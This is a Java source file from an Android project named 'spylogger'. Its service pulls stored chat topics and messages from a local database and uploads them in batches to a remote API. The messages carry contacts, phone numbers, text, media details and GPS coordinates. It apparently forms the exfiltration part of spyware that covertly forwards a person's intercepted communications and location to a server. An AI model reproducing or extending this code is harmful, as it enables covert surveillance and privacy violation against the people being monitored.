package com.gravatasufoca.spylogger.services;

import android.content.Context;
import android.util.Log;

import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoMensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.vos.RespostaRecebimentoVO;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.dao.GenericRawResults;
import com.j256.ormlite.field.DataType;
import com.j256.ormlite.stmt.UpdateBuilder;

import java.io.IOException;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;

import retrofit2.Call;
import retrofit2.Response;

/**
 * Created by bruno on 02/12/16.
 */

public class SendMensagensService extends SendDataService<RespostaRecebimentoVO> {
    private Context context;

    private static final int MAX_TOPICOS = 500;
    private static final int MAX_MENSAGENS = 5000;

    private Map<String, Map<Integer, DataType>> colunas;
    private String strColunas;

    public SendMensagensService(Context context, TaskComplete handler) {
        super(context, handler);
        this.context = context;
        colunas = Mensagem.columns();
        strColunas = getColunas(colunas);
    }

    public void enviarTopicos() {
        DatabaseHelper dbHelper = new DatabaseHelper(context);
        Dao<Topico, Integer> daoTopicos;
        GenericRawResults<String[]> raws = null;
        List<Topico> topicos = new ArrayList<>();
        Iterator<String[]> iterator;
        try {
            daoTopicos = dbHelper.getDao(Topico.class);

            raws = daoTopicos.queryRaw("select id,nome,grupo,tipoMensagem,(select group_concat(contato,'#') from ( select distinct contato from mensagem where topico_id=top.id)) from topico top where top.enviado=0 ");

            int contador = 0;
            iterator = raws.iterator();
            if (iterator.hasNext()) {
                while (iterator.hasNext()) {
                    String[] resultRaw = iterator.next();
                    Topico topico = new Topico.TopicoBuilder()
                            .setId(Integer.valueOf(resultRaw[0]))
                            .setNome(resultRaw[1])
                            .setGrupo("1".equals(resultRaw[2]))
                            .build(TipoMensagem.values()[Integer.parseInt(resultRaw[3])]);

                    topicos.add(topico);
                    contador++;
                    if (iterator.hasNext()) {
                        if (contador == MAX_TOPICOS) {
                            contador = 0;
                            enviarTopicos(topicos);
                            topicos = new ArrayList<>();
                        }
                    } else {
                        enviarTopicos(topicos);
                    }
                }
            } else {
                enviarMensagens();
            }

        } catch (SQLException e) {
            Log.e(this.getClass().getSimpleName(), e.getMessage());
        } finally {
            try {
                if (raws != null) {
                    raws.close();
                }
                if (dbHelper != null) {
                    dbHelper.close();
                }
            } catch (IOException ee) {
            }
        }
    }

    private void enviarMensagens() {
        DatabaseHelper dbHelper = new DatabaseHelper(context);
        Dao<Mensagem, Integer> daoMensagem;
        GenericRawResults<Object[]> raws = null;
        List<Mensagem> mensagens = new ArrayList<>();
        Iterator<Object[]> iterator;
        try {
            daoMensagem = dbHelper.getDao(Mensagem.class);

            raws = daoMensagem.queryRaw("select " + strColunas + " from mensagem where enviada=0", getTipos(colunas));
            int contador = 0;
            iterator = raws.iterator();
            while (iterator.hasNext()) {
                Object[] resultRaw = iterator.next();
                try {
                    Mensagem mensagem = new Mensagem.MensagemBuilder()
                            .setId((Integer) resultRaw[colunas.get("id").keySet().iterator().next()])
                            .setContato((String) resultRaw[colunas.get("contato").keySet().iterator().next()])
                            .setTipoMidia(resultRaw[colunas.get("tipoMidia").keySet().iterator().next()] == null ? TipoMidia.CONTATO : TipoMidia.valueOf((String) resultRaw[colunas.get("tipoMidia").keySet().iterator().next()]))
                            .setRemetente("1".equals(resultRaw[colunas.get("remetente").keySet().iterator().next()]))
                            .setMediaMime((String) resultRaw[colunas.get("midiaMime").keySet().iterator().next()])
                            .setNumeroContato((String) resultRaw[colunas.get("numeroContato").keySet().iterator().next()])
                            .setTamanhoArquivo((Long) resultRaw[colunas.get("tamanhoArquivo").keySet().iterator().next()])
                            .setTexto((String) resultRaw[colunas.get("texto").keySet().iterator().next()])
                            .setTopico(new Topico.TopicoBuilder().setId((Integer) resultRaw[colunas.get("topico_id").keySet().iterator().next()]).build(null))
                            .setData((Date) resultRaw[colunas.get("data").keySet().iterator().next()])
                            .setDataRecebida((Date) resultRaw[colunas.get("dataRecebida").keySet().iterator().next()])
                            .setLatitude((Double) resultRaw[colunas.get("latitude").keySet().iterator().next()])
                            .setLongitude((Double) resultRaw[colunas.get("longitude").keySet().iterator().next()])
                            .build();
                    mensagem.setRaw_data(resultRaw[colunas.get("raw_data").keySet().iterator().next()] != null ? (String) resultRaw[colunas.get("raw_data").keySet().iterator().next()] : null);

                    mensagens.add(mensagem);
                } catch (Exception e) {
                    Log.e("spylogger", e.getMessage());
                }
                contador++;
                if (iterator.hasNext()) {
                    if (contador == MAX_MENSAGENS) {
                        try {
                            if (raws != null) {
                                raws.close();
                            }
                            if (dbHelper != null) {
                                dbHelper.close();
                            }
                            enviarMensagens(mensagens);
                        } catch (IOException ee) {
                        }
                        break;
                    }
                } else {
                    try {
                        if (raws != null) {
                            raws.close();
                        }
                        if (dbHelper != null) {
                            dbHelper.close();
                        }
                        enviarMensagens(mensagens);
                    } catch (IOException ee) {
                    }
                }
            }
        } catch (SQLException e) {
            Log.e("spylogger", e.getMessage());
        } finally {
            try {
                if (raws != null) {
                    raws.close();
                }
                if (dbHelper != null) {
                    dbHelper.close();
                }
            } catch (IOException ee) {
            }
        }
    }

    private String getColunas(Map<String, Map<Integer, DataType>> colunas) {
        Set<String> keys = colunas.keySet();
        StringBuffer cols = new StringBuffer();
        Map<Integer, String> inverso = new HashMap<>();
        for (String col : keys) {
            Integer a = colunas.get(col).keySet().iterator().next();
            inverso.put(a, col);
        }
        List<Integer> ids = new ArrayList<>(inverso.keySet());
        Collections.sort(ids);
        for (Integer id : ids) {
            String tmp = inverso.get(id);
            cols.append(cols.toString().isEmpty() ? "" : ",").append(tmp);

        }
        return cols.toString();
    }

    private DataType[] getTipos(Map<String, Map<Integer, DataType>> colunas) {
        Set<String> keys = colunas.keySet();
        Map<Integer, DataType> inverso = new HashMap<>();
        for (String col : keys) {
            Integer a = colunas.get(col).keySet().iterator().next();
            inverso.put(a, colunas.get(col).values().iterator().next());
        }
        List<Integer> ids = new ArrayList<>(inverso.keySet());
        Collections.sort(ids);
        List<DataType> tipos = new ArrayList<>();
        for (Integer id : ids) {
            tipos.add(inverso.get(id));
        }
        DataType[] tmp = new DataType[tipos.size()];
        tipos.toArray(tmp);
        return tmp;
    }

    private void enviarMensagens(List<Mensagem> mensagens) {
        Call<RespostaRecebimentoVO> resp = sendApi.enviarMensagens(mensagens);
        resp.enqueue(this);
    }

    private void enviarTopicos(List<Topico> topicos) {
        Call<RespostaRecebimentoVO> resp = sendApi.enviarTopicos(topicos);
        resp.enqueue(this);
    }

    @Override
    public void onResponse(Call<RespostaRecebimentoVO> call, Response<RespostaRecebimentoVO> response) {
        RespostaRecebimentoVO resposta = response.body();

        if (resposta != null) {
            DatabaseHelper dbHelper = new DatabaseHelper(context);
            Dao<Topico, Integer> daoTopicos;
            Dao<Mensagem, Integer> daoMensagem;
            try {
                if (resposta.getTipo().equalsIgnoreCase("topico")) {
                    daoTopicos = dbHelper.getDao(Topico.class);

                    UpdateBuilder<Topico, Integer> ub = daoTopicos.updateBuilder();
                    ub.where().in("id", resposta.getIds());
                    ub.updateColumnValue("enviado", true);
                    try {
                        ub.update();
                    } catch (Exception e) {
                        try {
                            Thread.sleep(3000);
                            ub.update();
                        } catch (Exception e1) {
                        }
                    } finally {
                        if (dbHelper != null) {
                            dbHelper.close();
                        }
                    }
                    enviarMensagens();
                } else {
                    if (resposta.getTipo().equalsIgnoreCase("mensagem")) {

                        daoMensagem = dbHelper.getDao(Mensagem.class);
                        UpdateBuilder<Mensagem, Integer> ub = daoMensagem.updateBuilder();
                        ub.where().in("id", resposta.getIds());
                        ub.updateColumnValue("enviada", true);
                        ub.update();

                        if (dbHelper != null) {
                            dbHelper.close();
                        }

                        enviarMensagens();
                    }
                }

            } catch (SQLException e) {
                Log.e(this.getClass().getSimpleName(), e.getMessage());
            }
        }
    }
}
